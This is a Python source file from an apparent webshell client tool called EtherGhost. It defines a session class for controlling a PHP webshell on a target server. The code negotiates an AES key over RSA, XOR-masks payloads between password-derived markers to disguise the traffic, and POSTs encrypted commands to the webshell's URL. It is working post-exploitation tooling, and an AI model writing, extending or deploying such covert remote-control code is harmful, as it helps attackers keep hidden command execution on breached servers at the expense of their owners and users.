import asyncio
import typing as t
import hashlib
import logging
import base64
import random

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.strxor import strxor
import httpx

from ..core import exceptions

from ..core.base import (
    register_session,
    Option,
    OptionGroup,
    get_http_client,
)
from ..core.php_session_common import (
    PHPWebshellActions,
    PHPWebshellCommunication,
    php_webshell_action_options,
    php_webshell_communication_options,
)
from ..utils.cipher import (
    get_rsa_key,
    private_decrypt_rsa,
    encrypt_aes256_cbc,
    decrypt_aes256_cbc,
)

logger = logging.getLogger("core.sessions.php_etherghost")


@register_session
class PHPWebshellEtherGhostOpen(PHPWebshellCommunication, PHPWebshellActions):
    session_type = "ETHERGHOST_PHP_OPEN"
    readable_name = "[In development] EtherGhost Open"
    conn_options: t.List[OptionGroup] = [
        {
            "name": "Basic Connection",
            "options": [
                Option(
                    id="url",
                    name="URL",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="password",
                    name="Password",
                    type="text",
                    placeholder="******",
                    default_value="ether_ghost",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "Advanced Connection",
            "options": [
                Option(
                    id="timeout_refresh_client",
                    name="Refresh HTTP Session on timeout",
                    type="checkbox",
                    placeholder="Using the same PHPSESSID for long operations may block subsequent requests",
                    default_value=True,
                    alternatives=None,
                ),
                Option(
                    id="https_verify",
                    name="Verify HTTPS certificate",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
            ]
            + php_webshell_communication_options
            + php_webshell_action_options,
        },
    ]

    def __init__(self, session_conn: dict):
        super().__init__(session_conn)
        self.url = session_conn["url"]
        self.password = session_conn["password"]
        self.https_verify = session_conn.get("https_verify", False)
        self.client = get_http_client(verify=self.https_verify)
        self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)

        self.key = None
        self.key_communicate_lock = asyncio.Lock()

        password_md5 = hashlib.md5(self.password.encode("utf-8")).digest()
        self.start_mark, self.stop_mark = password_md5[:8], password_md5[8:16]

    async def handshake_aes_key(self):
        pubkey, _ = get_rsa_key()
        _, result = await self.submit_obfs("s", (pubkey))
        if result == "WRONG_NO_OPENSSL":
            raise exceptions.TargetRuntimeError("Target does not support OpenSSL")
        if result == "WRONG_NO_OPENSSL_FUNCTION":
            raise exceptions.TargetRuntimeError(
                "Target does not support required OpenSSL functions; they may be disabled"
            )
        self.key = private_decrypt_rsa(result)

    async def submit_http(self, payload: t.Union[str, bytes]) -> t.Union[int, str]:
        async with self.key_communicate_lock:
            if not self.key:
                await self.handshake_aes_key()
        # TODO: check encoding here, windows use gbk
        if isinstance(payload, str):
            payload = payload.encode("utf-8")
        payload_enc = encrypt_aes256_cbc(self.key, payload)
        status_code, result_enc = await self.submit_obfs("r", payload_enc)
        result = decrypt_aes256_cbc(self.key, result_enc)
        return status_code, result.decode("utf-8")

    async def submit_obfs(self, action: str, data: bytes) -> t.Union[int, bytes]:
        call = action.encode("utf-8") + data

        k = random.randbytes(8)
        k_repeated = k * (len(call) // 8 + 1)
        masked = strxor(call, k_repeated[: len(call)])
        raw_data = self.start_mark + k + masked + self.stop_mark

        status_code, response = await self.submit_raw(raw_data)
        if self.start_mark not in response or self.stop_mark not in response:
            raise exceptions.TargetError(
                "Cannot find markers; cannot extract result from traffic. Perhaps execution failed?"
            )
        return (
            status_code,
            response.partition(self.start_mark)[2].partition(self.stop_mark)[0],
        )

    async def submit_raw(self, payload: bytes) -> t.Union[int, bytes]:
        try:
            response = await self.client.request(
                method="POST", url=self.url, content=payload
            )
            return response.status_code, response.content
        except httpx.TimeoutException as exc:
            # Long operations (e.g., sleep 100) can trigger HTTP timeouts for a session id
            # The server keeps waiting for that session id
            # Reusing the same session id can block subsequent requests
            # Drop the session id and use another client for the request
            if self.timeout_refresh_client:
                logger.warning("HTTP request to target timed out; trying to refresh HTTP Client")
                self.client = get_http_client(verify=self.https_verify)
            raise exceptions.NetworkError("HTTP request to target timed out") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("Failed to send HTTP request to target: " + str(exc)) from exc
